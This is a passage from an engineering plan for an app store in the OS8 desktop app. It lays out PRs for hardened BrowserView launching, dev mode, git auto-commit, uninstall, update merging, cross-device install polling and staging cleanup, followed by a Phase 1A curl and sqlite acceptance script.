- Install worldmonitor (PR 1.16). Double-click its icon. The app loads inside a hardened BrowserView at `worldmonitor.localhost:8888/`.
- Click an external link inside the app → opens system browser (not in-place).
- Inside the app, attempt `window.open('https://example.com')` → opens system browser; the BrowserView is unaffected.
- A request to `getUserMedia({ video: true })` is silently denied.

Unit (`tests/preview-external.test.js`):

- `will-navigate` to `http://worldmonitor.localhost:8888/foo` (own subdomain) → not prevented.
- `will-navigate` to `http://other-app.localhost:8888/foo` (different external app's subdomain) → prevented; `shell.openExternal` called.
- `will-navigate` to `http://localhost:8888/api/something` (OS8 main origin) → prevented; opened externally (or alternatively, deny silently — user shouldn't be navigating away from the app at all).
- `will-navigate` to `https://google.com` → prevented; opened externally.
- `setWindowOpenHandler` returns `{ action: 'deny' }`.

### Acceptance criteria

- Worldmonitor launches in a hardened BrowserView; the page renders.
- External links open in system browser, not in-place.
- `window.os8` is populated per the manifest's declared capabilities (PR 1.9 wiring).
- Closing the tab calls `POST /processes/stop`, which kills the dev server within 5s.

### Cross-platform notes

`shell.openExternal` works identically on macOS / Linux / Windows.

### Spec deviations

None. Subdomain mode makes the navigation gate naturally host-based — much cleaner than the path-mode equivalent.

### Depends on

PR 1.9, 1.12, 1.13, 1.15. **GATED behind 1.14.**

### Open sub-questions

None.

---

## PR 1.20 — Window-chrome `os8://apps/<localSlug>` label (cosmetic)

**Goal.** When an external-app tab is active, the chrome's URL display reads `os8://apps/<localSlug>` even though the BrowserView loads `http://<slug>.localhost:8888/`. Cosmetic; no enforcement implications.

### Files

- **Modify:** `/home/leo/Claude/os8/src/renderer/main.js` — URL display logic (existing native path: read `previewUrlInput.value = …`); add a check for `app_type === 'external'`
- **Modify:** `/home/leo/Claude/os8/styles.css` (or `styles/components/preview-bar.css`) — minor styling for the cosmetic prefix

### Render rule

```js
// In renderer/main.js, where the URL bar is updated:
function updatePreviewUrlDisplay(app, currentBrowserUrl) {
  if (app.app_type === 'external') {
    elements.previewUrlInput.value = `os8://apps/${app.slug}`;
    elements.previewUrlInput.dataset.realUrl = currentBrowserUrl;   // for debug overlay if needed
    return;
  }
  elements.previewUrlInput.value = currentBrowserUrl;   // existing behavior
}
```

`previewUrlInput` is read-only for external apps (don't let users navigate by typing into it; navigation via the URL bar is a developer-mode-only affordance). Add `readOnly: true` when `app_type === 'external'`.

### Acceptance criteria

- External tab active → URL bar shows `os8://apps/worldmonitor`.
- Native tab active → URL bar shows the real URL (existing behavior).
- URL bar is read-only when an external tab is active.

### Cross-platform notes

None.

### Depends on

PR 1.19.

### Open sub-questions

None.

---

## PR 1.21 — Auto-generated CLAUDE.md for external apps

**Goal.** On install (PR 1.16 step 7), generate a minimal `CLAUDE.md` at `~/os8/apps/<id>/CLAUDE.md` documenting the manifest, declared capabilities, `window.os8` SDK, data dirs, per-app SQLite db. Ship `os8-sdk.d.ts` alongside for IDE autocomplete (resolves plan §10 Q7).

### Files

- **Create:** `/home/leo/Claude/os8/src/claude-md-external.js`
- **Modify:** `/home/leo/Claude/os8/src/services/app-installer.js` — wire the call into `_runApprove` step 7 (already stubbed in PR 1.16)

### Generator shape

```js
const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');
const { APPS_DIR } = require('../config');

function generateForExternal(db, app) {
  const manifest = yaml.load(app.manifest_yaml || '');
  const caps = manifest.permissions?.os8_capabilities || [];
  const md = `# ${manifest.name} — OS8 External App

This app was installed from the OS8 catalog. Source: ${manifest.upstream.git} @ ${app.upstream_resolved_commit}

## Local paths

- App source: \`~/os8/apps/${app.id}/\`
- Per-app blob storage: \`~/os8/blob/${app.id}/\`
- Per-app SQLite: \`~/os8/config/app_db/${app.id}.db\`
- Catalog manifest (read-only): copied to \`./.os8/manifest.yaml\`

## Declared capabilities

${caps.length === 0 ? '_None._' : caps.map(c => `- \`${c}\``).join('\n')}

## window.os8 SDK

Inside this app's BrowserView, OS8 exposes a typed SDK at \`window.os8\`. Methods
are present only when the manifest declares the corresponding capability.

${caps.length === 0 ? '_None declared._' : `Available methods (subset of the SDK):

${caps.map(c => `- \`${c}\` — see \`os8-sdk.d.ts\` for the call signature.`).join('\n')}`}

## Editing this app

When OS8's Dev Mode is on for this app, your edits in \`./src/\` and \`./public/\`
auto-save and are committed to a local \`user/main\` branch. The original install
is preserved on the \`upstream/manifest\` branch — \`git diff upstream/manifest..user/main\`
shows your divergence.

## Updating

When the catalog publishes a new commit for this app, OS8 will surface an update
banner. Updates with no local edits fast-forward; updates with local edits perform
a three-way merge — conflicts surface in a sidebar.

## Type definitions

\`os8-sdk.d.ts\` is shipped alongside this file. Import it in your editor (e.g.
\`/// <reference path="./os8-sdk.d.ts" />\`) for autocomplete.
`;
  const appDir = path.join(APPS_DIR, app.id);
  fs.writeFileSync(path.join(appDir, 'CLAUDE.md'), md, 'utf8');
  // Also copy os8-sdk.d.ts from src/templates/.
  const dts = fs.readFileSync(path.join(__dirname, 'templates', 'os8-sdk.d.ts'), 'utf8');
  fs.writeFileSync(path.join(appDir, 'os8-sdk.d.ts'), dts, 'utf8');
  // Manifest snapshot under .os8/.
  const dotOs8 = path.join(appDir, '.os8');
  fs.mkdirSync(dotOs8, { recursive: true });
  fs.writeFileSync(path.join(dotOs8, 'manifest.yaml'), app.manifest_yaml || '', 'utf8');
}

module.exports = { generateForExternal };
```

### Acceptance criteria

- Worldmonitor install yields `~/os8/apps/<id>/CLAUDE.md` with the capability list matching its manifest.
- `os8-sdk.d.ts` is present at the app root.
- `.os8/manifest.yaml` snapshot matches the manifest at install time.

### Depends on

PR 1.9 (SDK types), PR 1.16 (installer hook).

### Open sub-questions

None.

---

## PR 1.22 — Dev mode toggle + chokidar watcher + log panel (split: 1.22a + 1.22b)

**Goal.** Per-app `apps.dev_mode` flag. When ON: file tree shows `~/os8/apps/<id>/`, chokidar watches per `dev.watch` (respects `.gitignore`), log panel surfaces stdout/stderr from the running dev process. When OFF: hidden. Settings → Idle-timeout slider lands here too (plan §10 Q3).

**Split.** 1.22a (~200 LOC): toggle UI + file tree integration. 1.22b (~200 LOC): watcher wiring + log panel.

### Files

- **Create:** `/home/leo/Claude/os8/src/renderer/dev-mode-toggle.js` (1.22a)
- **Modify:** `/home/leo/Claude/os8/src/renderer/file-tree.js` — extend storage menu with "App source" option for externals (1.22a)
- **Modify:** `/home/leo/Claude/os8/src/renderer/terminal.js` — reuse the build-status-tab pattern for the dev log panel (1.22b)
- **Modify:** `/home/leo/Claude/os8/src/services/app-process-registry.js` — surface `onProgress` events to the renderer (already has hook in PR 1.12; add IPC bridge here)
- **Modify:** `/home/leo/Claude/os8/preload.js` — add `appStore.onDevLog(appId, callback)` and `apps.setDevMode(appId, on)`
- **Modify:** `/home/leo/Claude/os8/src/renderer/settings.js` — Settings panel slider for idle timeout (5min, 15min, 30min, 1h, 2h, 4h, Never)

### Toggle behavior

- Toggle in the app's dev-mode panel. Click ON → POST `/api/apps/:id/dev-mode` with `{ enabled: true }`. The route updates `apps.dev_mode = 1`. If the process is already running, it stays running but the watcher is wired in via `AppProcessRegistry.get(appId)._watcherDispose` (currently null when devMode=false at start; toggle late requires a "rebuild watcher" path — small extension).
- Toggle OFF → watcher disposed; file tree panel hides; logs panel hides.

### Watcher

Already implemented in `runtime-adapters/node.js` `watchFiles` (PR 1.11b). The registry forwards `onProgress({ kind: 'change' })` events; the renderer subscribes via `appStore.onDevLog`.

### Log panel

Reuse `src/renderer/terminal.js`'s build-status pattern. New `dev-log` tab type with text accumulation + filtering by stream (stdout/stderr).

### Idle timeout slider (resolves §10 Q3)

```html
Settings → Apps → External app idle timeout:
[ 5 min ] [ 15 min ] [● 30 min] [ 1 h ] [ 2 h ] [ 4 h ] [ Never ]
```

Pill selector. Persists to `settings.external_app_idle_timeout_ms`. On change, `AppProcessRegistry.get().setIdleTimeout(ms)`.

### Acceptance criteria

- Toggle ON for worldmonitor → file tree shows `~/os8/apps/<id>/`; editing `src/App.tsx` triggers HMR (visible in BrowserView).
- Log panel shows Vite stdout (e.g. `ready in 423 ms`).
- Slider change to "Never" prevents idle reaping (verified by leaving the app idle 31 min).

### Depends on

PR 1.19 (BrowserView), PR 1.11b (watcher), PR 1.12 (registry).

### Open sub-questions

None.

---

## PR 1.23 — Fork-on-first-edit + dirty-tree recovery

**Goal.** PR 1.16 already runs `git init` + `user/main` branch creation at install. PR 1.23 adds: debounced auto-commit on user/AI edits (5s window, message `[user] <ISO ts> <touched files>`); dirty-tree recovery dialog on dev-mode activation if the working tree is unexpectedly dirty.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/app-git.js`
- **Modify:** `/home/leo/Claude/os8/src/services/app-process-registry.js` — wire `app-git`'s debounced committer into the watcher path (when devMode=true)
- **Modify:** `/home/leo/Claude/os8/src/renderer/dev-mode-toggle.js` (PR 1.22) — show recovery dialog when `app-git` reports dirty state on activation

### Auto-commit shape

```js
const AppGit = {
  // Debounced commit on user/main. Pause during adapter ops (install/update).
  startDebouncedCommitter(appDir, { debounceMs = 5000 } = {}) {
    let pending = null;
    let touched = new Set();
    const commit = async () => {
      if (touched.size === 0) return;
      const files = [...touched]; touched.clear();
      try {
        await runCmd('git', ['-C', appDir, 'add', '.']);
        const status = await runCmd('git', ['-C', appDir, 'status', '--porcelain']);
        if (!status.trim()) return;
        await runCmd('git', ['-C', appDir, 'commit', '-m',
          `[user] ${new Date().toISOString()} ${files.slice(0, 5).join(' ')}${files.length > 5 ? ' …' : ''}`]);
      } catch (e) { console.warn('[app-git] commit:', e.message); }
    };
    return {
      onChange(file) {
        touched.add(path.relative(appDir, file));
        if (pending) clearTimeout(pending);
        pending = setTimeout(commit, debounceMs);
      },
      pause()  { if (pending) { clearTimeout(pending); pending = null; } },
      flush()  { if (pending) { clearTimeout(pending); pending = null; } return commit(); },
    };
  },

  // Inspect git state on dev-mode activation. Returns one of:
  //   { kind: 'clean' }                                  (proceed)
  //   { kind: 'dirty', branch, status, untracked }       (prompt user)
  async checkOnActivation(appDir) {
    const branch = (await runCmd('git', ['-C', appDir, 'branch', '--show-current'])).trim();
    const status = await runCmd('git', ['-C', appDir, 'status', '--porcelain']);
    if (!status.trim()) return { kind: 'clean', branch };
    return { kind: 'dirty', branch, status, untracked: status.includes('??') };
  },

  // User chose 'continue': switch to user/main if not already; leave files.
  async continueOnDirty(appDir) {
    const cur = (await runCmd('git', ['-C', appDir, 'branch', '--show-current'])).trim();
    if (cur !== 'user/main') {
      await runCmd('git', ['-C', appDir, 'checkout', '-B', 'user/main']);
    }
  },

  // 'reset': git checkout <upstream-commit> -- . + git clean -fd
  async resetToManifest(appDir, resolvedCommit) {
    await runCmd('git', ['-C', appDir, 'checkout', resolvedCommit, '--', '.']);
    await runCmd('git', ['-C', appDir, 'clean', '-fd']);
  },

  // 'stash': git stash; switch to user/main; user can pop later
  async stashAndContinue(appDir) {
    await runCmd('git', ['-C', appDir, 'stash', 'push', '-u', '-m', `os8 auto-stash ${new Date().toISOString()}`]);
    await runCmd('git', ['-C', appDir, 'checkout', '-B', 'user/main']);
  },
};
```

### Acceptance criteria

- First edit creates a commit on `user/main` 5s after the last touch.
- Restart OS8 with a dirty tree → on next dev-mode activation, dialog: { Continue / Reset / Stash }.
- "Reset" wipes user changes back to the manifest commit.

### Depends on

PR 1.16 (installer creates `user/main`), PR 1.22 (watcher).

### Open sub-questions

None.

---

## PR 1.24 — Uninstall flow (tiered, data-preserve default)

**Goal.** Right-click app icon → Uninstall. Confirm modal: "remove `<name>` and delete its source code" (default); checkbox "Also delete this app's data (databases, files, settings) — irreversible." On confirm: stop process, unregister proxy, `rm -rf ~/os8/apps/<id>/`, set `apps.status = 'uninstalled'`. If "delete data" → drop `~/os8/blob/<id>/`, `~/os8/config/app_db/<id>.db`, delete `app_env_variables` rows.

### Files

- **Modify:** `/home/leo/Claude/os8/src/renderer/apps.js` — extend the right-click menu (existing context-menu hook around lines 99-110)
- **Modify:** `/home/leo/Claude/os8/src/services/app.js` — add `uninstall(db, appId, { deleteData })`
- **Modify:** `/home/leo/Claude/os8/src/routes/apps.js` — add `POST /api/apps/:id/uninstall`

### Shape

```js
// src/services/app.js
AppService.uninstall = async function(db, appId, { deleteData = false } = {}) {
  const app = AppService.getById(db, appId);
  if (!app) throw new Error('app not found');
  if (app.app_type !== 'external') throw new Error('only external apps support uninstall');

  // 1. Stop process + unregister proxy.
  try {
    const APR = require('./app-process-registry').get();
    await APR.stop(appId, { reason: 'uninstall' });
  } catch {}
  try { require('./reverse-proxy').unregister(app.slug); } catch {}

  // 2. Delete code.
  const appDir = path.join(APPS_DIR, appId);
  if (fs.existsSync(appDir)) fs.rmSync(appDir, { recursive: true, force: true });

  // 3. Optionally delete data.
  if (deleteData) {
    const blobDir  = path.join(BLOB_DIR, appId);
    const dbPath   = path.join(CONFIG_DIR, 'app_db', `${appId}.db`);
    if (fs.existsSync(blobDir))  fs.rmSync(blobDir, { recursive: true, force: true });
    if (fs.existsSync(dbPath))   fs.unlinkSync(dbPath);
    db.prepare('DELETE FROM app_env_variables WHERE app_id = ?').run(appId);
  }

  // 4. Mark row.
  db.prepare("UPDATE apps SET status = 'uninstalled', updated_at = datetime('now') WHERE id = ?")
    .run(appId);
};
```

Reinstall path (existing — orphan data detection): `AppCatalogService.install` (PR 1.16) checks for `apps WHERE external_slug = ? AND status = 'uninstalled'` before minting a new row; if found and the user confirms in the install plan, it reuses the row's `id` (and therefore the orphan blob/db). UI: a "Restore data from previous install?" checkbox in the plan modal when an orphan match is detected.

### Acceptance criteria

- Right-click → Uninstall → default flow: code removed, data preserved; reinstall offers "restore data."
- Uninstall + "delete data" checkbox: blob, db, env_variables all gone.

### Depends on

PR 1.16, PR 1.19.

### Open sub-questions

None.

---

## PR 1.25 — Update detection + manual update flow with three-way merge

**Goal.** `AppCatalogService.sync` (PR 1.3) compares `app_catalog.upstream_resolved_commit` vs `apps.upstream_resolved_commit`; mismatches set `apps.update_available = 1, update_to_commit = <newSha>`. UI: dot on home-screen icon + Settings → "Updates available" list. Manual update: fast-forward if no `user_branch`; three-way merge into `user/main` otherwise. Conflicts surface in a sidebar.

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/app-catalog.js` — add `update(db, appId, targetCommit)` + sync compares set the flag
- **Modify:** `/home/leo/Claude/os8/src/renderer/apps.js` — render dot when `app.update_available === 1`
- **Create:** `/home/leo/Claude/os8/src/renderer/update-banner.js` — banner shown on app open
- **Create:** `/home/leo/Claude/os8/src/renderer/update-conflict-sidebar.js` — conflict-resolution UI

### Update flow

1. `AppCatalogService.sync` runs (4 AM cron). For each entry where `apps.upstream_resolved_commit !== app_catalog.upstream_resolved_commit`, set `apps.update_available=1, update_to_commit=<newSha>`.
2. Renderer reads `apps.update_available` on the home-screen render path; draws a dot on the icon.
3. User opens app → `update-banner.js` renders if `update_available=1`.
4. User clicks Update → `POST /api/apps/:id/update`.
5. `AppCatalogService.update`:
   - `git fetch <upstream> <targetCommit>` (depth 1 if possible).
   - Inspect `apps.user_branch`:
     - **Null (no user edits):** fast-forward `user/main` to `targetCommit`; run runtime adapter install; restart.
     - **Set:** `git merge <targetCommit>` into `user/main`. Clean → run install + restart. Conflict → set `apps.update_status='conflict'`; surface conflict files in sidebar.
6. Conflict sidebar (resolves spec §11.11): list of conflicting files (from `git status --porcelain`); per-file "Open in editor" + "Mark resolved" buttons; bottom: "Abort merge" reverts via `git merge --abort`.

### Auto-update opt-in (Verified channel only)

`apps.auto_update = 1` enables auto-update only when `user_branch IS NULL` (no edits). Default OFF. Setting toggle in the app's settings panel.

### Acceptance criteria

- Worldmonitor's manifest re-resolves to a new commit → next sync sets `update_available=1`.
- Open the app → banner appears.
- Update with no edits → fast-forward + restart succeeds.
- Update with conflicting edits → conflict sidebar lists files; "Mark resolved" per file; "Abort" reverts.

### Depends on

PR 1.16, PR 1.23.

### Open sub-questions

None.

---

## PR 1.26 — Cross-device install (`pending_installs` polling)

**Goal.** Signed-in users who clicked Install on os8.ai from a different device get a prompt on their desktop within 60s.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/pending-installs-poller.js`
- **Modify:** `/home/leo/Claude/os8/main.js` — start poller after `startServer` (around line 320)

### Poller shape

```js
const PendingInstallsPoller = {
  _timer: null,
  start(db, mainWindow) {
    const tick = async () => {
      try {
        const session = await AccountService.getSession(db);
        if (!session?.token) return;
        const r = await fetch('https://os8.ai/api/account/pending-installs', {
          headers: { 'Authorization': `Bearer ${session.token}` },
          signal: AbortSignal.timeout(10_000),
        });
        if (!r.ok) return;
        const { pendingInstalls = [] } = await r.json();
        for (const p of pendingInstalls) {
          mainWindow?.webContents.send('app-store:open-install-plan', {
            slug: p.appSlug,
            commit: p.upstreamResolvedCommit,
            channel: p.channel,
            source: 'os8.ai-cross-device',
            pendingInstallId: p.id,
          });
          // Mark consumed (so it doesn't re-fire on next tick).
          fetch(`https://os8.ai/api/account/pending-installs/${p.id}/consume`, {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${session.token}` },
          }).catch(() => {});
        }
      } catch {}
    };
    this._timer = setInterval(tick, 60_000);
    this._timer.unref?.();
    setTimeout(tick, 5_000);    // first tick 5s after start (don't hammer)
  },
  stop() { if (this._timer) { clearInterval(this._timer); this._timer = null; } },
};
```

### Acceptance criteria

- Sign in to os8.ai on web; click Install on worldmonitor; within 60s the desktop install plan modal opens.
- After install completes (or user cancels), `pending_installs/:id/consume` is POSTed.

### Depends on

PR 1.18, os8.ai PR 0.11.

### Open sub-questions

None.

---

## PR 1.27 — (Removed — subdomain mode is the v1 default)

This PR was removed during execution planning. Subdomain mode (`<slug>.localhost:8888`) is now the v1 default and only routing mode — folded into PR 1.13. Path mode was rejected for sharing one browser origin across all installed apps (architectural trust leak) and for taxing manifest authors with per-framework base-path config.

**What landed where:**

- **Subdomain proxy primitive** → PR 1.13. Single mode; no `mode` parameter.
- **`will-navigate` host-based gate** → PR 1.19.
- **`<slug>.localhost` URL construction in `/processes/start`** → PR 1.19.
- **Pre-flight DNS resolution check (Windows hosts-entry prompt)** → PR 1.16's `ensureSubdomainResolves` helper. Modern macOS / Linux / Win11 resolve `*.localhost` natively per RFC 6761; legacy/AV-restricted Windows surfaces a UAC-elevated hosts-entry prompt.

See app-store-plan.md §10 decision 11 and spec §1 "Why subdomain mode" for the full rationale.

### Depends on

None.

### Open sub-questions

None.

---

## PR 1.28 — End-to-end acceptance test

**Goal.** Install worldmonitor end-to-end through the entire pipeline; edit `App.tsx` (or equivalent) via Claude Code (or just `fs.writeFile`); verify HMR updates the live preview through OS8's BrowserView.

### Files

- **Create:** `/home/leo/Claude/os8/tests/e2e/app-store-worldmonitor.test.js`

### Outline

```js
import { test, expect, _electron as electron } from '@playwright/test';
import path from 'node:path';
import fs from 'node:fs';

test('worldmonitor install → run → edit → HMR', async () => {
  const electronApp = await electron.launch({
    args: [path.resolve(__dirname, '..', '..', 'main.js')],
    env: { ...process.env, OS8_HOME: '/tmp/os8-e2e-' + Date.now() },
  });
  // Wait for the OS8 main window.
  const window = await electronApp.firstWindow();
  // Drive: open app store browser → click worldmonitor → approve → wait installed.
  // (Phase 1A entry might use an internal-only "POST /install" instead — see slice section.)
  // …
  // Wait for `apps.dev_mode` toggle ON.
  // Edit App.tsx.
  // Inspect the BrowserView via Playwright's frame access.
  // Assert HMR updates without full reload.
  await electronApp.close();
}, { timeout: 5 * 60 * 1000 });
```

### Acceptance criteria

- Test passes on macOS and Linux. Runs in <5 min.

### Depends on

Every prior PR.

### Open sub-questions

None.

---

## PR 1.29 — `reapStaging` on startup

**Goal.** On startup, walk `~/os8/apps_staging/` and remove directories whose `app_install_jobs` row is `failed | cancelled` OR older than 24h with status not in `installed`.

### Files

- **Modify:** `/home/leo/Claude/os8/src/services/app-catalog.js` — add `reapStaging(db)`
- **Modify:** `/home/leo/Claude/os8/main.js` — call after the migrator runs (around line 263)

### Shape

```js
AppCatalogService.reapStaging = function(db) {
  const stagingRoot = path.join(OS8_DIR, 'apps_staging');
  if (!fs.existsSync(stagingRoot)) return;
  const dirs = fs.readdirSync(stagingRoot);
  for (const d of dirs) {
    const job = db.prepare('SELECT id, status, created_at FROM app_install_jobs WHERE id = ?').get(d);
    let drop = false;
    if (!job) drop = true;                                    // orphan
    else if (job.status === 'failed' || job.status === 'cancelled') drop = true;
    else if (job.status === 'installed') drop = true;          // staging already moved or stale
    else {
      const ageMs = Date.now() - new Date(job.created_at).getTime();
      if (ageMs > 24 * 60 * 60 * 1000) drop = true;            // 24h timeout
    }
    if (drop) {
      try { fs.rmSync(path.join(stagingRoot, d), { recursive: true, force: true }); }
      catch (e) { console.warn('[reapStaging]', d, e.message); }
      // Also mark the row failed if it was still mid-flight.
      if (job && !['installed', 'failed', 'cancelled'].includes(job.status)) {
        db.prepare("UPDATE app_install_jobs SET status='failed', error_message='reaped on startup', updated_at=datetime('now') WHERE id = ?")
          .run(job.id);
      }
    }
  }
  // Also walk for orphan ".installing" markers from cross-mount fallback.
  const appsDir = require('../config').APPS_DIR;
  for (const f of fs.readdirSync(appsDir)) {
    if (!f.startsWith('.') || !f.endsWith('.installing')) continue;
    try { fs.unlinkSync(path.join(appsDir, f)); } catch {}
    // The corresponding partial dir is whatever the marker refers to — leave for manual cleanup.
  }
};
```

### Acceptance criteria

- Crash mid-install → restart → staging dir is gone; job row has `status='failed'`.
- A failed job from a prior session is cleaned within 24h.

### Depends on

PR 1.5.

### Open sub-questions

None.

---

## Phase 1A — Vertical slice

The smallest 13 PRs that prove the architecture before the remaining 15 land (PR 1.27 was removed; 28 active PRs total). Cut from plan §5; concretized here with a deterministic acceptance script.

### The 13 PRs in the slice

1. **PR 1.1** — schema migration. Foundation.
2. **PR 1.13** — `ReverseProxyService` primitive.
3. **PR 1.14** — Vite HMR smoke test. **The architectural gate.**
4. **PR 1.4** — manifest validation + plan UI shell.
5. **PR 1.5** — static fetch + state machine.
6. **PR 1.6** — security review.
7. **PR 1.10** — sanitized env builder.
8. **PR 1.11** — Node runtime adapter (1.11a + 1.11b).
9. **PR 1.12** — process registry.
10. **PR 1.15** — mount middleware (gated on 1.14).
11. **PR 1.16** — install pipeline glue (1.16a + 1.16b).
12. **PR 1.17** — install plan UI (1.17a + 1.17b).
13. **PR 1.19** — hardened BrowserView + launch path.

### Excluded from the slice (and why)

- **1.2 (protocol handler), 1.3 (catalog sync), 1.18 (deeplink), 1.26 (cross-device polling):** the slice uses a hand-authored manifest fed via a manual `POST /api/app-store/install` call. No os8.ai involvement.
- **1.7 (scoped API), 1.8 (`requireAppContext`), 1.9 (`window.os8` SDK):** the slice's worldmonitor declares `os8_capabilities: []`. The scoped surface isn't exercised — defer. **Caveat:** these MUST merge before any app declaring a capability is approved.
- **1.20 (chrome label), 1.21 (CLAUDE.md gen), 1.22 (dev mode), 1.23 (fork on first edit), 1.24 (uninstall), 1.25 (update flow), 1.27 (subdomain), 1.28 (E2E test), 1.29 (reapStaging):** polish or delivery; slice doesn't need them.

### The slice's acceptance script — concrete curl/click sequence

This is the minimal demo that proves the Phase 1A architecture works.

#### Setup (one-time)

```sh
# 1. Worldmonitor's manifest hand-authored locally (not via catalog sync).
cat > /tmp/wm-manifest.json << 'EOF'
{
  "slug": "worldmonitor",
  "channel": "verified",
  "manifestYaml": "<paste raw YAML from os8ai/os8-catalog/apps/worldmonitor/manifest.yaml>",
  "manifestSha": "<sha256 of the YAML>",
  "catalogCommitSha": "0000000000000000000000000000000000000000",
  "upstreamDeclaredRef": "v2.5.23",
  "upstreamResolvedCommit": "e51058e1765ef2f0c83ccb1d08d984bc59d23f10"
}
EOF

# 2. Insert into the local app_catalog so AppCatalogService.get() finds it.
sqlite3 ~/os8/config/os8.db <<SQL
INSERT INTO app_catalog (
  id, slug, name, description, publisher, channel, category, icon_url, screenshots,
  manifest_yaml, manifest_sha, catalog_commit_sha, upstream_declared_ref, upstream_resolved_commit,
  license, runtime_kind, framework, architectures, risk_level, install_count, synced_at
) VALUES (
  'wm-1', 'worldmonitor', 'World Monitor',
  'Real-time global intelligence dashboard.',
  'koala73', 'verified', 'intelligence',
  'https://raw.githubusercontent.com/.../icon.png', '[]',
  '<paste YAML>', '<sha>', '0000…', 'v2.5.23',
  'e51058e1765ef2f0c83ccb1d08d984bc59d23f10',
  'AGPL-3.0-only', 'node', 'vite', '["arm64","x86_64"]',
  'low', 0, datetime('now')
);
SQL
```

#### Demo

```sh
# 3. Start OS8.
npm start
```

```sh
# 4. Kick off install.
curl -X POST http://localhost:8888/api/app-store/install \
  -H 'Content-Type: application/json' \
  -d '{
    "slug": "worldmonitor",
    "commit": "e51058e1765ef2f0c83ccb1d08d984bc59d23f10",
    "channel": "verified",
    "source": "manual"
  }'
# Response: { "jobId": "<job-id>", "status": "cloning" }
```

```sh
# 5. Poll the job. Expect transitions cloning → reviewing → awaiting_approval.
watch -n 1 "curl -s http://localhost:8888/api/app-store/jobs/<job-id> | jq '.status, .reviewReport.riskLevel'"
# When status='awaiting_approval', proceed.
```

(Click) **Open the OS8 window. The install plan modal is visible (PR 1.17 fires on a job-update event). Confirm the manifest renders correctly: name, license, no required secrets, no critical findings.**

(Click) **Click Approve.**

```sh
# Or via curl:
curl -X POST http://localhost:8888/api/app-store/jobs/<job-id>/approve \
  -H 'Content-Type: application/json' -d '{"secrets":{}}'
```

```sh
# 6. Watch progress. Expect status='installing' → 'installed'.
curl -s http://localhost:8888/api/app-store/jobs/<job-id> | jq .
```

```sh
# 7. Confirm the apps row exists with app_type='external'.
sqlite3 ~/os8/config/os8.db "SELECT id, slug, app_type, status, channel FROM apps WHERE external_slug='worldmonitor';"
# id=<uuid> | slug=worldmonitor | app_type=external | status=active | channel=verified
```

(Click) **Back in OS8, the worldmonitor icon appears on the home grid. Double-click it.**

(Verify) **The hardened BrowserView opens, loads `worldmonitor.localhost:8888/`, and renders the World Monitor dashboard.**

```sh
# 8. Confirm the proxy is wired and HMR works.
curl -i http://worldmonitor.localhost:8888/ | head
# 200 OK; Vite's index.html.

# 9. Confirm sanitized env: no API keys leaked.
ps -o command= $(pgrep -f "vite.*worldmonitor") | grep -i 'ANTHROPIC\|OPENAI'
# (no matches)
```

If all of the above hold, the architecture works:

- ✓ Reverse proxy + WebSocket HMR (1.13 / 1.14 / 1.15).
- ✓ Review-before-install (1.5 / 1.6).
- ✓ Sanitized env (1.10).
- ✓ Runtime adapter (1.11).
- ✓ Atomic staging→apps move (1.16).
- ✓ Hardened BrowserView (1.19).

### Slice acceptance criteria — the formal checklist

- The 13 PRs above are merged on macOS + Linux; CI green.
- The acceptance script above runs end-to-end without manual editing of the codebase.
- A second click on the worldmonitor icon (after a `Cmd+Q`+restart) starts the process again from disk; HMR still works.

---

## What flows into Phase 2

After Phase 1A's slice passes, the remaining 15 PRs are **glue and UX**, not architectural risk. (PR 1.27 was removed; 28 active PRs total minus the 13 in the slice = 15 remaining.) Phase 2 builds on a stable foundation:

1. **Stable per-app trust boundary** — sanitized env, scoped API, `requireAppContext`, hardened BrowserView. Phase 2's Python adapter (`uv`-based) inherits these without change.
2. **State machine** — `app_install_jobs`. Phase 2 reuses it for Python and Docker installs; Docker adapter just adds new `runtime.kind: docker` cases in the registry.
3. **Reverse proxy** — works for any HTTP-serving runtime. Streamlit (Phase 2.2) and Gradio (Phase 2.2) already serve HTTP; the proxy doesn't need to know.
4. **Install pipeline** — clone → review → approve → install → atomic move. Phase 2.5's Docker fallback adds a `docker run --mount` step in the install path; the orchestrator stays the same.
5. **Catalog format** — `appspec-v1.json` already includes `runtime.kind: python`, `static`, `docker` (Phase 2 unlocks docker via JSON Schema bump or v2 schema). Phase 2 manifests don't need new top-level fields.

What Phase 2 cannot reuse:

- **Vite-specific HMR test** (PR 1.14). Streamlit and Gradio have their own HMR mechanisms (Streamlit re-runs on file change natively; Gradio uses `block_demo.queue().launch(reload=True)`). Phase 2.1 adds a python-runtime smoke test analogous to 1.14.
- **Node `--ignore-scripts` policy.** Python's equivalent is `pip install --no-deps` semantics, which differ. Phase 2.1 ships the python-side equivalent.

What lands in Phase 3 atop Phase 1's foundation:

- **Developer Import** (3.1): leans entirely on the install pipeline; the only new code is the auto-AppSpec generator.
- **Community channel** (3.3): another row in `app_catalog.channel`. The trust boundary is unchanged.
- **Supply-chain analyzer** (3.6): a new finding type in `AppReviewService.findings`. No state-machine changes.

The shape Phase 1 commits to — argv arrays, frozen install, sanitized env, scoped API, atomic staging move, hardened BrowserView, signed-commit-pinned manifests — is the right shape. Phase 2 and Phase 3 add runtimes and channels on top; the trust model and pipeline don't change.

---

*End of phase-1-plan.md.*
